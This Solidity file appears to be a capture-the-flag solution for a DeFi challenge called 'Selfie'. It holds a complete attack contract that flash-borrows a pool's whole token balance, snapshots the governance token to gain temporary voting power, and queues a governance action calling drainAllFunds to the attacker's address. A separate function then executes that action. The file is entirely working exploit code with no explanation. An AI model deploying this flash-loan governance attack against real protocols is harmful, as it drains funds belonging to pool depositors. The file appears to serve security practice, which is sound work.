// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface ISelfieReciever {
  function receiveTokens(address token, uint256 borrowAmount) external;
}

interface ISelfiePool {
  function flashLoan(uint256 borrowAmount) external;
  function token() external returns (address);
  function governance() external returns (address);
}

contract SelfieAttack is ISelfieReciever {
  using Address for address;

  ISelfiePool private _selfiePool;
  address private owner;
  uint256 public actionId;

  constructor(ISelfiePool selfiePool) {
    _selfiePool = selfiePool;
    owner = msg.sender;
  }

  function receiveTokens(address token, uint256 borrowAmount) external override {
    address governance = _selfiePool.governance();

    bytes memory govTokenCall = governance.functionCall(abi.encodeWithSignature("governanceToken()"));
    address govToken = abi.decode(govTokenCall, (address));
    govToken.functionCall(abi.encodeWithSignature("snapshot()"));
    
    bytes memory callData = abi.encodeWithSignature("drainAllFunds(address)", owner);
    bytes memory rawActionId = governance.functionCall(abi.encodeWithSignature("queueAction(address,bytes,uint256)", address(_selfiePool), callData, 0));
    actionId = abi.decode(rawActionId, (uint256));
    IERC20(token).transfer(msg.sender, borrowAmount);
  }

  function attack() external {
    IERC20 token = IERC20(_selfiePool.token());
    _selfiePool.flashLoan(token.balanceOf(address(_selfiePool)));
  }

  function execute() external {
    require(actionId != 0, "No actionId");
    address governance = _selfiePool.governance();
    governance.functionCall(abi.encodeWithSignature("executeAction(uint256)", actionId));
  }
}